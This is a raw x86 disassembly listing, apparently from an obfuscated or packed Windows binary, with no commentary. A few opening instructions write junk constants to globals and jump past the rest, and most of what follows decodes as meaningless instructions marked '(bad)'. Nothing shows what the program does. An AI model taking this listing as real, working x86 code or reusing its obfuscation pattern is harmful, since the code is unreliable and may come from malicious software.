  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433813,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x4337e7,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433813,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43378f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43381b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43379b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x433853,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0xce59335f
  406b85:	xlat   BYTE PTR ds:[ebx]
  406b86:	add    bh,BYTE PTR [ebx]
  406b88:	jle    0x406c08
  406b8a:	mov    esp,0x6c7e7e7f
  406b8f:	shl    BYTE PTR [eax-0x53],cl
  406b92:	test   BYTE PTR [edi-0x54b84e97],cl
  406b98:	jae    0x406b91
  406b9a:	xor    eax,0xe2a749e2
  406b9f:	dec    ebp
  406ba0:	cmp    al,0x4c
  406ba2:	repz fisttp QWORD PTR [edi+0x67]
  406ba6:	retf   0x3802
  406ba9:	jbe    0x406b40
  406bab:	call   0xd47f7389
  406bb0:	xor    eax,0x48129fb6
  406bb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bb6:	xor    al,0xc4
  406bb8:	pop    ds
  406bb9:	int    0xe4
  406bbb:	scas   eax,DWORD PTR es:[edi]
  406bbc:	outs   dx,DWORD PTR ds:[esi]
  406bbd:	pop    ds
  406bbe:	aad    0x6
  406bc0:	mov    WORD PTR [ebp+0x5a943919],fs
  406bc6:	cmp    ebx,DWORD PTR [esi+0x1ad1a853]
  406bcc:	mov    al,0x8b
  406bce:	retf   
  406bcf:	and    al,0xb7
  406bd1:	push   edx
  406bd2:	ror    DWORD PTR [edi+eiz*8+0x4bd78675],cl
  406bd9:	popf   
  406bda:	adc    BYTE PTR [ecx+0x37],dh
  406bdd:	dec    eax
  406bde:	inc    edi
  406bdf:	bound  esp,QWORD PTR [eax+0xa]
  406be2:	xchg   ecx,eax
  406be3:	pop    edx
  406be4:	mov    eax,ds:0xe73fd45a
  406be9:	sbb    al,0x6c
  406beb:	std    
  406bec:	ffree  st(4)
  406bee:	sbb    DWORD PTR [edx-0x73],edi
  406bf1:	jne    0x406bad
  406bf3:	xor    ecx,ebp
  406bf5:	(bad)  
  406bf6:	lods   eax,DWORD PTR ds:[esi]
  406bf7:	es sbb ah,bh
  406bfa:	or     al,0x1f
  406bfc:	test   eax,0x7791f3ab
  406c01:	icebp  
  406c02:	cmp    eax,eax
  406c04:	outs   dx,BYTE PTR ds:[esi]
  406c05:	icebp  
  406c06:	clc    
  406c07:	cli    
  406c08:	paddd  mm0,QWORD PTR [ecx+0x4c]
  406c0c:	loopne 0x406c45
  406c0e:	icebp  
  406c0f:	inc    edx
  406c10:	cld    
  406c11:	cmp    eax,0xdd6c8981
  406c16:	aas    
  406c17:	iret   
  406c18:	ret    0x4a87
  406c1b:	stos   DWORD PTR es:[edi],eax
  406c1c:	shr    DWORD PTR [ebx],1
  406c1e:	fnsave [ebp-0x1e0a8671]
  406c24:	mov    ah,0x89
  406c26:	out    0x28,eax
  406c28:	xor    al,0x15
  406c2a:	mov    ch,0x3a
  406c2c:	jns    0x406c13
  406c2e:	nop
  406c2f:	pop    ds
  406c30:	jmp    0x3780:0x7930bcd
  406c37:	ja     0x406bf3
  406c39:	aas    
  406c3a:	dec    eax
  406c3b:	lock mov WORD PTR [eax-0x4785f06],gs
  406c42:	ds bnd jnp 0x406c8a
  406c46:	call   0xf7efbace
  406c4b:	and    dl,BYTE PTR [ecx+0x74]
  406c4e:	or     ebx,DWORD PTR [eax]
  406c50:	iret   
  406c51:	sub    eax,0x63bee4cc
  406c56:	sbb    BYTE PTR [ecx+0x42],0x5d
  406c5a:	or     BYTE PTR [esi],al
  406c5c:	jmp    0x406c99
  406c5e:	pop    esp
  406c5f:	retf   0x30c5
  406c62:	das    
  406c63:	ficomp WORD PTR [esp+esi*2-0x47]
  406c67:	mov    edi,0xac8e45ca
  406c6c:	mov    al,ds:0xfa44dfa9
  406c71:	mov    DWORD PTR [eax+0x2f3fe6e4],esp
  406c77:	push   es
  406c78:	lds    esp,FWORD PTR [bp+si-0x2b98]
  406c7d:	out    0x81,eax
  406c7f:	pop    ds
  406c80:	xor    esi,DWORD PTR [ebx+0x40]
  406c83:	cdq    
  406c84:	sub    cl,BYTE PTR [esi+0x3f]
  406c87:	cwde   
  406c88:	jl     0x406c97
  406c8a:	adc    DWORD PTR [ebp+0x173b6a95],edi
  406c90:	and    esi,ebx
  406c92:	or     ecx,DWORD PTR [edi]
  406c94:	test   BYTE PTR ds:0xc1aafbdc,cl
  406c9a:	adc    eax,0xa805bf68
  406c9f:	ret    
  406ca0:	dec    edi
  406ca1:	test   al,0x28
  406ca3:	cwde   
  406ca4:	adc    DWORD PTR [edx-0xa6ef55e],ebx
  406caa:	dec    ebx
  406cab:	sub    DWORD PTR [ecx+ecx*2],edi
  406cae:	jg     0x406d19
  406cb0:	inc    eax
  406cb1:	jg     0x406cde
  406cb3:	adc    BYTE PTR [ebx*2-0x68fc1ca6],al
  406cba:	dec    esp
  406cbb:	ret    0x13b3
  406cbe:	aaa    
  406cbf:	inc    edi
  406cc0:	adc    bl,BYTE PTR [edi+0x60bea237]
  406cc6:	cld    
  406cc7:	add    dh,BYTE PTR [eax+0x7938c9d2]
  406ccd:	outs   dx,DWORD PTR ds:[esi]
  406cce:	out    dx,al
  406ccf:	jno    0x406cd3
  406cd1:	bnd ja 0x406d37
  406cd4:	inc    ebx
  406cd5:	push   ecx
  406cd6:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cd8:	mov    ebx,DWORD PTR [edx-0x4]
  406cdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cdc:	jns    0x406ce1
  406cde:	mov    edx,0x1596d451
  406ce3:	sub    BYTE PTR [ecx-0x62b0ce05],0xec
  406cea:	sbb    DWORD PTR [ebp+0x5ff5f4b5],esi
  406cf0:	mov    ds:0x8f602178,al
  406cf5:	sub    bh,0x84
  406cf8:	out    dx,eax
  406cf9:	mov    esi,0x13850737
  406cfe:	xchg   ecx,ecx
  406d00:	jns    0x406ccf
  406d02:	or     eax,0x8273f3a4
  406d07:	(bad)  
  406d08:	add    BYTE PTR [ecx-0x57],bl
  406d0b:	pushf  
  406d0c:	icebp  
  406d0d:	xor    edi,DWORD PTR [esi+0x40]
  406d10:	or     al,0xf2
  406d12:	pop    eax
  406d13:	sbb    ah,dl
  406d15:	mov    ebp,DWORD PTR [ecx]
  406d17:	adc    eax,0x590af47d
  406d1c:	js     0x406d0c
  406d1e:	mov    esp,0xc4c5eadc
  406d23:	(bad)  
  406d24:	shl    DWORD PTR [edi+edi*1],cl
  406d27:	pusha  
  406d28:	es stc 
  406d2a:	xchg   BYTE PTR [ecx-0x75ca693f],bh
  406d30:	gs shr bh,1
  406d33:	fistp  QWORD PTR [ecx+0x650e2f0]
  406d39:	clc    
  406d3a:	js     0x406ce6
  406d3c:	retf   
  406d3d:	mov    esp,0x81d03827
  406d42:	fsubr  QWORD PTR [esi+0x3b]
  406d45:	dec    ebx
  406d46:	dec    ecx
  406d47:	mov    ebp,DWORD PTR [edx+0x522ef3c3]
  406d4d:	mov    esp,0x3366acfc
  406d52:	sar    DWORD PTR [ecx+0x3b02],0x81
  406d59:	sbb    eax,0x4338af
  406d5e:	xchg   ebx,eax
  406d5f:	aaa    
  406d60:	inc    ebx
  406d61:	add    BYTE PTR [esi+0x3],ah
  406d64:	rol    DWORD PTR [ecx+0x4338a305],0x0
  406d6b:	push   edi
  406d6c:	jge    0x406d6e
  406d6e:	add    BYTE PTR [ebx-0x48f0f7b3],cl
  406d74:	rol    BYTE PTR [ecx+0x4337e31d],0x0
  406d7b:	(bad)  
  406d7c:	aaa    
  406d7d:	inc    ebx
  406d7e:	add    cl,ch
  406d80:	fiadd  DWORD PTR [ecx]
  406d82:	add    BYTE PTR [eax],al
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0x57
  406d91:	stos   BYTE PTR es:[edi],al
  406d92:	mov    ebp,0x7e3840ee
  406d97:	jle    0x406d55
  406d99:	jg     0x406e19
  406d9b:	jle    0x406df8
  406d9d:	int3   
  406d9e:	and    eax,0xcd107854
  406da3:	xor    al,0x14
  406da5:	push   ss
  406da6:	mov    edx,0xabaa0aa6
  406dab:	cdq    
  406dac:	ins    DWORD PTR es:[edi],dx
  406dad:	mov    al,ds:0x751040f
  406db2:	stc    
  406db3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406db4:	sbb    BYTE PTR [ebp+0x7593e048],dh
  406dba:	cmc    
  406dbb:	jnp    0x406df1
  406dbd:	bound  esi,QWORD PTR [eax]
  406dbf:	mov    bh,0xfc
  406dc1:	dec    ebp
  406dc2:	sbb    ebx,ebx
  406dc4:	hlt    
  406dc5:	push   ds
  406dc6:	and    DWORD PTR [ebx],0x60
  406dc9:	clc    
  406dca:	bound  ebx,QWORD PTR [ecx+ebp*4+0x32f8faeb]
  406dd1:	popa   
  406dd2:	xchg   esp,eax
  406dd3:	mov    bl,0xff
  406dd5:	pusha  
  406dd6:	mov    al,0xb0
  406dd9:	stos   BYTE PTR es:[edi],al
  406dda:	(bad)  
  406ddb:	pop    esi
  406ddc:	imul   eax,DWORD PTR [ebx+ebp*2],0xffffff9f
  406de0:	adc    eax,0xa6d7264c
  406de5:	(bad)  
  406de6:	scas   al,BYTE PTR es:[edi]
  406de7:	call   0x348b:0x47100edd
  406dee:	inc    eax
  406def:	lds    esp,FWORD PTR [ebx]
  406df1:	dec    esi
  406df2:	cmp    edx,edx
  406df4:	fadd   QWORD PTR ds:[edi+0x1fad3d3a]
  406dfb:	(bad)  [ebx-0x6e4ca6f9]
  406e01:	pop    ebp
  406e02:	ins    BYTE PTR es:[edi],dx
  406e03:	dec    eax
  406e04:	mov    al,0x74
  406e06:	push   0x874f7bdc
  406e0b:	mov    eax,0x7b22fa46
  406e10:	adc    DWORD PTR [esi],ebx
  406e12:	mov    BYTE PTR [edx+0xb39b60],ah
  406e18:	fidiv  WORD PTR [edx]
  406e1a:	xor    al,0xfd
  406e1c:	mov    ah,0xc8
  406e1e:	aaa    
  406e1f:	fnstenv [esp+edi*1-0x54d8bb45]
  406e26:	stc    
  406e27:	test   eax,0x89fdb244
  406e2c:	outs   dx,BYTE PTR ds:[esi]
  406e2d:	aam    0xff
  406e2f:	cmc    
  406e30:	sahf   
  406e31:	xchg   ebp,eax
  406e32:	in     eax,dx
  406e33:	out    dx,al
  406e34:	add    DWORD PTR [esi-0x5e4a8ee2],edx
  406e3a:	adc    ebx,DWORD PTR [esi+0x28]
  406e3d:	xor    eax,0x241582e4
  406e42:	mov    bl,0xc2
  406e44:	or     bh,al
  406e46:	jge    0x406def
  406e48:	dec    ebx
  406e49:	or     BYTE PTR [edx-0x32],dh
  406e4c:	loopne 0x406ecb
  406e4e:	pushf  
  406e4f:	cmp    DWORD PTR [esi+0xb],ecx
  406e52:	lds    esi,FWORD PTR [edx+0x3b]
  406e55:	in     eax,dx
  406e56:	je     0x406e65
  406e58:	sbb    bl,al
  406e5a:	mov    WORD PTR [ebp-0x10a3d42c],es
  406e60:	jle    0x406e19
  406e62:	jge    0x406e45
  406e64:	mov    cl,0x4f
  406e66:	push   0x7e
  406e68:	fcomp  QWORD PTR [esi]
  406e6a:	loope  0x406e6d
  406e6c:	(bad)  
  406e6e:	xchg   ebp,eax
  406e6f:	aad    0x5f
  406e71:	xchg   BYTE PTR [esi+eiz*2+0xaa88b26],al
  406e78:	scas   eax,DWORD PTR es:[edi]
  406e79:	rcl    DWORD PTR [ebx],0x3d
  406e7c:	jl     0x406ee9
  406e7e:	imul   ebp,DWORD PTR [esi+0x40ef0732],0xffffffbf
  406e85:	and    ah,dl
  406e87:	shr    DWORD PTR [edi-0x759b9928],1
  406e8d:	sar    DWORD PTR [edx+0x1a],0x41
  406e91:	pop    es
  406e92:	lods   al,BYTE PTR ds:[esi]
  406e93:	inc    edi
  406e94:	std    
  406e95:	dec    ebx
  406e96:	add    DWORD PTR [edi],0xffffffe8
  406e99:	dec    esi
  406e9a:	std    
  406e9b:	fisub  DWORD PTR [ebp-0x67308a01]
  406ea1:	mov    edx,0xa02fdfb9
  406ea6:	in     eax,dx
  406ea7:	neg    DWORD PTR [edx]
  406ea9:	push   esp
  406eaa:	pop    edx
  406eab:	test   DWORD PTR [esi-0x4e],ebx
  406eae:	out    0x37,al
  406eb0:	xor    eax,0x2e9dc377
  406eb5:	mov    cs,WORD PTR [edx+eax*4]
  406eb8:	in     eax,0x23
  406eba:	inc    esp
  406ebb:	mov    eax,ds:0x3b345784
  406ec0:	pop    ecx
  406ec1:	test   DWORD PTR [eax-0x7919eda4],eax
  406ec7:	mov    al,ds:0x8f760fc2
  406ecc:	lods   al,BYTE PTR ds:[esi]
  406ecd:	dec    ebx
  406ece:	ja     0x406f44
  406ed0:	fld    QWORD PTR [ecx]
  406ed2:	daa    
  406ed3:	push   ebp
  406ed4:	sub    eax,0x72609f3f
  406ed9:	sbb    bh,ah
  406edb:	pop    ebx
  406edc:	imul   edi,ebx,0xfb6db099
  406ee2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ee3:	push   esi
  406ee4:	js     0x406f0c
  406ee6:	out    dx,eax
  406ee7:	sbb    eax,0x3105cf2
  406eec:	push   cs
  406eed:	stc    
  406eee:	inc    ecx
  406eef:	sub    eax,0xb6bc4aa5
  406ef4:	fild   DWORD PTR [ecx-0x17591dd6]
  406efa:	xchg   ecx,eax
  406efb:	cmp    bl,BYTE PTR [eax+0x57]
  406efe:	sahf   
  406eff:	iret   
  406f00:	or     edx,DWORD PTR [ecx-0x1c]
  406f03:	pop    edi
  406f04:	popa   
  406f05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f06:	sub    DWORD PTR [edx+0x50],esi
  406f09:	std    
  406f0a:	loopne 0x406f66
  406f0c:	aad    0x8f
  406f0e:	shl    DWORD PTR [esi],cl
  406f10:	jno    0x406ee3
  406f12:	sti    
  406f13:	push   esi
  406f14:	xchg   BYTE PTR [edx+0x1c6f697b],bl
  406f1a:	fld    DWORD PTR [esi-0x84df0c5]
  406f20:	mov    ebp,0xa94a675f
  406f25:	and    cl,dl
  406f27:	sbb    eax,DWORD PTR [ebx]
  406f29:	mov    eax,0x707698c6
  406f2e:	pop    esi
  406f2f:	stc    
  406f30:	mov    edi,0x264358b2
  406f35:	sbb    BYTE PTR [ecx],bl
  406f37:	mov    ebx,0x52929662
  406f3c:	lods   al,BYTE PTR ds:[esi]
  406f3d:	in     al,dx
  406f3e:	fwait
  406f3f:	test   esi,ebp
  406f41:	les    esp,FWORD PTR [ebp-0x2]
  406f44:	inc    esp
  406f45:	dec    edi
  406f46:	mov    ds:0x77b47858,eax
  406f4b:	sub    al,cl
  406f4d:	xor    al,0x52
  406f4f:	or     BYTE PTR [edi+0x36d353c6],bh
  406f55:	mov    esi,0xb25da9a1
  406f5a:	mov    dh,0xb6
  406f5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f5d:	(bad)  
  406f5e:	not    eax
  406f60:	and    DWORD PTR ds:0x43378f,0x4337d3
  406f6a:	and    eax,DWORD PTR [ecx]
  406f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  406f6f:	mov    DWORD PTR [ecx],eax
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0xa264976c
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0xbe7e7e7f
  406f9f:	mov    ch,0xa8
  406fa1:	icebp  
  406fa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fa3:	xor    dl,BYTE PTR [ebp-0x3251294]
  406fa9:	push   ss
  406faa:	jmp    0xf20f7dbf
  406faf:	cmp    BYTE PTR [esi],0xdc
  406fb2:	push   edi
  406fb3:	add    DWORD PTR [edx-0x1bf21d76],edi
  406fb9:	jae    0x40702b
  406fbb:	mov    BYTE PTR [esi],dh
  406fbd:	add    BYTE PTR [ecx+edx*4+0x3c075df2],al
  406fc4:	sub    eax,0x3f774b66
  406fc9:	jbe    0x406fe9
  406fcb:	push   eax
  406fcc:	popa   
  406fcd:	mov    al,ds:0x31c36b5c
  406fd2:	mov    fs,WORD PTR [ebx+0x4169720e]
  406fd8:	jae    0x406fc4
  406fda:	inc    ebp
  406fdb:	int    0x4b
  406fdd:	dec    esi
  406fde:	je     0x406fdc
  406fe0:	shl    DWORD PTR ds:0x9f00f8e6,cl
  406fe6:	mov    DWORD PTR [edx-0xdca58ad],ebx
  406fec:	(bad)  
  406fee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fef:	es in  al,0xfa
  406ff2:	pop    ebx
  406ff3:	cs cmp dh,bh
  406ff6:	xor    DWORD PTR [esi-0x61],ebp
  406ff9:	and    al,0xb8
  406ffb:	or     BYTE PTR [esi+0x2620b076],0xba
  407002:	hlt    
  407003:	ss ins BYTE PTR es:[edi],dx
  407005:	mov    ah,0x1e
  407007:	pusha  
  407008:	inc    ecx
  407009:	sbb    ebp,DWORD PTR [ecx+0x2d]
  40700c:	loop   0x407082
  40700e:	push   ecx
  40700f:	lock push ebx
  407011:	cmp    ebp,esi
  407013:	stos   BYTE PTR es:[edi],al
  407014:	ja     0x406fa1
  407016:	ss mov eax,0x3bfa690
  40701c:	pop    eax
  40701d:	jb     0x407072
  40701f:	sar    DWORD PTR [esi+0x43],cl
  407022:	fcom   QWORD PTR [ecx+0x5e8d5250]
  407028:	aas    
  407029:	sti    
  40702a:	cld    
  40702b:	add    al,0x2a
  40702d:	fucom  st(2)
  40702f:	jmp    0x48a:0x743854a7
  407036:	push   0xdf8e1f8e
  40703b:	mov    cl,0x1b
  40703d:	scas   al,BYTE PTR es:[edi]
  40703e:	fwait
  40703f:	xor    ecx,ebp
  407041:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407043:	mov    ds:0xd363427f,eax
  407048:	xor    DWORD PTR [eax],0xa76384ac
  40704e:	mov    eax,ds:0xb49bb091
  407053:	inc    esp
  407054:	(bad)  
  407055:	clc    
  407056:	fucomp st(1)
  407058:	je     0x407051
  40705a:	ds jne 0x407063
  40705d:	lods   al,BYTE PTR ds:[esi]
  40705e:	add    al,0x32
  407060:	mov    ds:0xa9f97f3c,eax
  407065:	in     eax,0x14
  407067:	imul   edx,edx,0x75
  40706a:	push   ebp
  40706b:	(bad)  
  40706c:	out    0x2,eax
  40706e:	loope  0x40705c
  407070:	sbb    ch,BYTE PTR [ebp-0x5f]
  407073:	(bad)  
  407074:	mov    bh,0x3e
  407076:	rcl    BYTE PTR [eax],0x7d
  407079:	test   al,0xe7
  40707b:	retf   
  40707c:	test   BYTE PTR [ecx+edx*2-0x6f],ch
  407080:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407081:	sbb    edi,DWORD PTR [edi-0x79ce0493]
  407087:	or     al,0x3
  407089:	je     0x407109
  40708b:	pop    ebp
  40708c:	add    eax,0xfd7007cc
  407091:	and    al,0x92
  407093:	(bad)  
  407094:	adc    DWORD PTR [ecx-0xb],eax
  407097:	push   0x49c3953
  40709c:	mov    ?,WORD PTR [esi+0x740e35c]
  4070a2:	xchg   esi,eax
  4070a3:	ja     0x407094
  4070a5:	xchg   ecx,eax
  4070a6:	iret   
  4070a7:	fistp  DWORD PTR [eax]
  4070a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070aa:	stos   DWORD PTR es:[edi],eax
  4070ab:	push   cs
  4070ac:	sti    
  4070ad:	mov    ch,0xcf
  4070af:	lods   eax,DWORD PTR ds:[esi]
  4070b0:	jns    0x4070d6
  4070b2:	js     0x40708b
  4070b4:	aad    0xa8
  4070b6:	xchg   edi,eax
  4070b7:	xor    eax,0x24391051
  4070bc:	scas   eax,DWORD PTR es:[edi]
  4070bd:	push   eax
  4070be:	xor    BYTE PTR [ecx],bl
  4070c0:	retf   
  4070c1:	(bad)  
  4070c2:	mov    bh,0xf
  4070c4:	addr16 pop eax
  4070c6:	ja     0x407098
  4070c8:	dec    ebp
  4070c9:	jp     0x40709c
  4070cb:	xchg   edx,eax
  4070cc:	push   edx
  4070cd:	inc    edx
  4070ce:	lods   eax,DWORD PTR ds:[esi]
  4070cf:	pop    eax
  4070d0:	jno    0x4070e2
  4070d2:	sti    
  4070d3:	pop    edx
  4070d4:	into   
  4070d5:	mov    ds:0xcb896dae,al
  4070da:	mov    bl,0xfd
  4070dc:	xor    ecx,DWORD PTR [ebx-0x1e053314]
  4070e2:	lods   eax,DWORD PTR ds:[esi]
  4070e3:	ret    0xaa4c
  4070e6:	lods   al,BYTE PTR ds:[esi]
  4070e7:	sub    eax,0xeb8a4049
  4070ec:	es dec ebp
  4070ee:	imul   esp,DWORD PTR ds:0x6113c9f,0xfffffffe
  4070f5:	mov    ebp,0xe43508de
  4070fa:	adc    DWORD PTR [edi+0x7],edi
  4070fd:	dec    edx
  4070fe:	and    DWORD PTR [edi],edi
  407100:	inc    ebx
  407101:	xor    eax,0x6e70c640
  407106:	test   bh,ch
  407108:	mov    ebx,0xbe6538ea
  40710d:	mov    WORD PTR [ebx+edx*8],gs
  407110:	(bad)  
  407111:	imul   eax,DWORD PTR [edi+0x3f],0xc
  407115:	or     eax,0x14e011ab
  40711a:	push   ds
  40711b:	pop    ds
  40711c:	push   0xfffffffc
  40711e:	pop    ebp
  40711f:	ins    BYTE PTR es:[edi],dx
  407120:	repz or BYTE PTR [ebx+0x32fa7da7],al
  407127:	or     al,0xf7
  407129:	stos   DWORD PTR es:[edi],eax
  40712a:	xchg   ebx,eax
  40712b:	and    DWORD PTR [ebx-0x31],ebp
  40712e:	xor    eax,0x7ff86790
  407133:	dec    ebx
  407134:	(bad)  
  407135:	jns    0x407121
  407137:	dec    edx
  407138:	mov    ds:0x893c99c1,eax
  40713d:	repnz mov ebp,0xcffd98b0
  407143:	mov    ds:0x9a5d4262,al
  407148:	sub    dl,bh
  40714a:	mov    DWORD PTR [esi+0x3679c82d],0x7f16706a
  407154:	dec    esi
  407155:	mov    esp,0x26bebfc5
  40715a:	mov    DWORD PTR [edi+ecx*2-0xbe0e81],ebx
  407161:	jne    0x40716b
  407163:	call   0x407353
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	sub    al,0xd8
  40717d:	xchg   ebx,eax
  40717e:	arpl   sp,cx
  407180:	les    edi,FWORD PTR [esi+0x7e]
  407183:	mov    esp,0xee7e7e7f
  407188:	xrelease mov BYTE PTR [edx+0x5d38d34e],al
  40718f:	js     0x4071b0
  407191:	lea    ecx,ds:0x407cc5c6
  407197:	rol    DWORD PTR [edx-0x2f],0x6a
  40719b:	cmp    ah,BYTE PTR [edx-0x6b]
  40719e:	xchg   ebx,eax
  40719f:	pop    edx
  4071a0:	das    
  4071a1:	mov    WORD PTR [eax+0x2af3ca02],cs
  4071a7:	out    0xdb,eax
  4071a9:	mov    esi,0x7bdc3189
  4071ae:	aam    0xfd
  4071b0:	xchg   esi,eax
  4071b1:	ror    dl,cl
  4071b3:	dec    ebp
  4071b4:	or     ah,dl
  4071b6:	shr    DWORD PTR [edx+0x38],cl
  4071b9:	mov    eax,ds:0xac0c39eb
  4071be:	mov    ebp,0x87287061
  4071c3:	add    DWORD PTR [ebp-0x35a52caa],0xffffffa4
  4071ca:	sub    edi,DWORD PTR [esp+eax*8]
  4071cd:	fimul  DWORD PTR [eax+0x5d]
  4071d0:	xchg   edi,eax
  4071d1:	pop    ecx
  4071d2:	adc    eax,0x87279281
  4071d7:	adc    dl,BYTE PTR [ebx]
  4071d9:	repnz and dh,BYTE PTR [ecx]
  4071dc:	repnz sub eax,0xe4d15be0
  4071e2:	add    eax,0xb636cd8a
  4071e7:	pop    ss
  4071e8:	mov    BYTE PTR [edx+0x5c9aaf53],ah
  4071ee:	inc    edx
  4071ef:	bound  edx,QWORD PTR [ebp+0x6b]
  4071f2:	cs inc ebx
  4071f4:	mov    DWORD PTR [ebx+0xa],ebx
  4071f7:	dec    ebp
  4071f8:	jae    0x4071a6
  4071fa:	push   esi
  4071fb:	mov    ah,BYTE PTR [ebp+0x44a0db79]
  407201:	or     ebp,DWORD PTR [eax+0x66a6bd6c]
  407207:	fstp   QWORD PTR [ecx]
  407209:	outs   dx,BYTE PTR ds:[esi]
  40720a:	(bad)  
  40720b:	fisubr WORD PTR [ebp+0x249f1e63]
  407211:	imul   ecx,DWORD PTR [ecx],0x75
  407214:	cs pop edx
  407216:	and    edi,esi
  407218:	push   eax
  407219:	(bad)  
  40721a:	mov    ebp,0xa7b6f305
  40721f:	mov    DWORD PTR [ebx+0x22beef12],edx
  407225:	xor    DWORD PTR [ebx-0x73],edi
  407228:	test   DWORD PTR [esi+ebx*4-0x30],esp
  40722c:	or     ebx,DWORD PTR [eax-0x3c]
  40722f:	je     0x4071d4
  407231:	add    esi,eax
  407233:	ds xchg edx,eax
  407235:	mov    esp,0xf4a0f981
  40723a:	cmp    BYTE PTR [edi+0x40],ch
  40723d:	adc    DWORD PTR [edx],esi
  40723f:	ret    
  407240:	mov    dl,0xe5
  407242:	lods   al,BYTE PTR ds:[esi]
  407243:	xchg   edx,eax
  407244:	les    esi,FWORD PTR [ecx+0x7059d90b]
  40724a:	test   BYTE PTR [ebx-0x68],ah
  40724d:	push   esi
  40724e:	in     al,dx
  40724f:	pop    ebp
  407250:	je     0x40729f
  407252:	mov    ds:0x8cb25d9c,eax
  407257:	xchg   ebx,eax
  407258:	(bad)  
  40725a:	mul    BYTE PTR [edx]
  40725c:	ins    DWORD PTR es:[edi],dx
  40725d:	mov    WORD PTR [ebx+0x60],?
  407260:	leave  
  407261:	jae    0x407249
  407263:	jo     0x407237
  407265:	add    BYTE PTR [ebx],ch
  407267:	pop    ds
  407268:	xchg   dl,ch
  40726a:	sbb    eax,0x5d75c7f
  40726f:	(bad)  
  407270:	jmp    0x407211
  407272:	dec    ecx
  407273:	nop
  407274:	lahf   
  407275:	sub    ch,BYTE PTR [edi]
  407277:	and    al,0xa5
  407279:	mov    bl,0xbd
  40727b:	push   esi
  40727c:	and    al,0x36
  40727e:	adc    ebx,ebp
  407280:	jno    0x407224
  407282:	fs int 0xc5
  407285:	pop    es
  407286:	xor    al,0x63
  407288:	test   al,0xbb
  40728a:	push   esp
  40728b:	lods   al,BYTE PTR ds:[esi]
  40728c:	dec    ecx
  40728d:	inc    esp
  40728e:	loop   0x40725e
  407290:	cmp    DWORD PTR [esi+0x3f],esp
  407293:	(bad)  
  407295:	cmp    eax,0x52448d03
  40729a:	int3   
  40729b:	lock loopne 0x407285
  40729e:	push   ecx
  40729f:	mov    edi,DWORD PTR ds:0x14d1b262
  4072a5:	imul   esp,eax,0x83a2153c
  4072ab:	inc    edx
  4072ac:	xchg   DWORD PTR [ebp-0x55],ebp
  4072af:	ins    BYTE PTR es:[edi],dx
  4072b0:	adc    bl,bl
  4072b2:	jle    0x4072f5
  4072b4:	test   al,0xfc
  4072b6:	jmp    0x72f7fd49
  4072bb:	pop    esp
  4072bc:	mov    al,ds:0xa093ecc7
  4072c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072c2:	aad    0xe6
  4072c4:	xchg   esp,eax
  4072c5:	pop    ebx
  4072c6:	(bad)  
  4072c7:	loopne 0x4072ce
  4072c9:	pop    ebx
  4072ca:	ret    0x4a8b
  4072cd:	dec    ebx
  4072ce:	jmp    0xaee438d5
  4072d3:	adc    al,0x57
  4072d5:	ins    BYTE PTR es:[edi],dx
  4072d6:	inc    edi
  4072d7:	ror    BYTE PTR [edi],0x4c
  4072da:	imul   esi,DWORD PTR [ebx],0x5f44ce0a
  4072e0:	xchg   esp,eax
  4072e1:	push   0x8d68b5e5
  4072e6:	mov    cl,0xf4
  4072e8:	pop    es
  4072e9:	retf   0x13db
  4072ec:	fs ds mov ebp,0xcff9816e
  4072f3:	jmp    0x407342
  4072f5:	jmp    0x4072c5
  4072f7:	ds and cl,cl
  4072fa:	xor    esp,edx
  4072fc:	add    DWORD PTR ss:[eax+0x12f1e291],ebx
  407303:	popa   
  407304:	adc    ah,bl
  407306:	outs   dx,DWORD PTR ds:[esi]
  407307:	(bad)
  40730a:	jne    0x407348
  40730c:	jg     0x4072cc
